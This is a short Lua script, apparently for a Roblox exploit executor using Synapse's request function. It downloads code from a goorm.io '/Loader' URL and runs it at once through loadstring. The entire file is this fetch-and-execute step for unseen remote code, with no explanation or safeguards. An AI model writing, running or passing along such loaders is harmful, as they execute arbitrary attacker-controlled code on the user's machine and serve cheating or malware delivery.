local request = (syn and syn.request) or request
local res = request({
    Url = "https://izbpumz92w8b3qjwapcljvctpxt8pk.run.goorm.io/Loader",
    Method = "GET"
})
loadstring(res.Body)()
